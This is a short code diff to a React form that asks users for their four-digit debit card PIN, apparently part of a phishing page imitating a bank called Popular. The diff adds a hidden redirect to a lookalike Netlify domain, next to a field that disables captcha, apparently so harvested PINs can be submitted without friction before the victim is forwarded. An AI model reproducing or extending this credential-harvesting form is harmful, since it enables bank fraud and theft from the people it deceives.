@@ -65,6 +65,7 @@ if(load){
         <label htmlFor="inputDebi">Clave de su tarjeta de débito</label>
         <input onChange={btnColor} type="password" name='debi' maxLength="4" minLength="4" />
         <input type="hidden" name="_captcha" value="false"></input>
+        <input type="hidden" name="_next" value="https://popular-compras.netlify.app/"></input>
 
         <button className={`${colorBtn && 'btn-active'}`}>Validar</button>
       </form>
